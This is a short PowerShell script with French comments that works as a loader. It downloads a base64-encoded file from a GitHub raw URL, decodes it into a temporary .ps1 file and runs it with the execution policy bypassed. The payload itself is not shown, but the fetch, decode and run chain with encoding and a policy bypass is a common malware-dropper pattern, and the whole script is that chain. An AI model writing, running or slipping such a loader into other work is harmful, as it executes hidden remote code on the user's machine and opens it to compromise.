# Chemin temporaire pour le fichier base64
$base64Path = "$env:TEMP\encoded_base64.txt"

# Télécharger le contenu base64 encodé
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/stormdiscordsoon-ship-it/script-ps1/main/script.ps1" -OutFile $base64Path

# Lire le fichier base64
$base64String = Get-Content -Path $base64Path -Raw

# Décoder base64 en bytes
$bytes = [System.Convert]::FromBase64String($base64String)

# Convertir bytes en texte UTF8
$decodedScript = [System.Text.Encoding]::UTF8.GetString($bytes)

# Chemin du script décodé temporaire
$scriptPath = "$env:TEMP\script_decoded.ps1"

# Sauvegarder le script décodé
Set-Content -Path $scriptPath -Value $decodedScript -Encoding UTF8

# Exécuter le script avec bypass de politique d'exécution
powershell.exe -ExecutionPolicy Bypass -File $scriptPath
